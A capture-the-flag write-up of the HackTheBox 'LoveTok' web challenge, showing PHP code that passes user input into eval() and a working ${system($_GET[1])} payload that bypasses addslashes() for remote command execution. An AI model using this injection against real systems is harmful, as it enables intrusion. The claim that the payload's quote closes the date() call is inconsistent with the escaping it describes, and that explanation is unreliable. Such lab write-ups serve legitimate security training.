---
layout: post
title: "LoveTok (HTB web)"
subtitle: "a php eval() in a date format string, with addslashes bypassed by backticks"
date: 2023-04-12
tags: [htb, ctf, web, php, rce]
category: writeups
kind: challenge
tldr: "The app builds a date string inside eval() from an attacker-controlled format value. addslashes() guards the input, but the backtick / ${} trick slips past it. I closed the date() call, injected system($_GET[1]), and read the flag file dropped at the filesystem root."
---

## the challenge

The site showed a countdown built from a server-rendered time. The interesting piece was `TimeModel`, which formats a predicted time:

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```

The `format` parameter comes from the request and lands inside an `eval()`.

## the bug

`getTime()` concatenates `$this->format` straight into a string that `eval()` runs. So control over `format` is control over PHP source. The plan is the same shape as a SQL injection: close the `date("..."` argument early, then append my own statement and comment out the rest.

```php
eval('$time = date("");system("ls")//. $this->format . '", strtotime("' . $this->prediction . '"));');
```

The catch is the constructor running `addslashes($format)`, which escapes my quotes. The bypass is the backtick / `${}` interpolation trick: PHP evaluates `${...}` inside a double-quoted string, and that path does not need escaped quotes. The minimal form is `${print(`ls`)}`, where backticks are PHP's shell-exec operator and `print` echoes the result, all without a single or double quote for `addslashes` to escape. I went a step further and wrapped `${system($_GET[1])}` so I could pull the command from a second parameter instead of editing the payload each time.

## the solve

Final request, with the format closing the `date(` call and the addslashes-safe payload following:

```http
GET /?format=`");${system($_GET[1])}&1=ls+../ HTTP/1.1
Host: TARGET
```

`")` closes the date argument, `${system($_GET[1])}` runs the command interpolation, and `1=ls ../` supplies it. The response listed the parent directory and the flag file sat at the filesystem root with a randomized suffix:

```text
bin
boot
...
flagXXXXX
home
...
```

## the flag

I swapped the command from the directory listing to a read of that randomly named flag file at `/`, and the value came back inline in the rendered time response. It read like `HTB{...eval...}`.

## references

- [d7x, LoveTok: php addslashes restricted quotes bypass](https://d7x.promiselabs.net/2021/02/18/htb-challenge-lovetok-php-addslashes-restricted-quotes-bypass/)
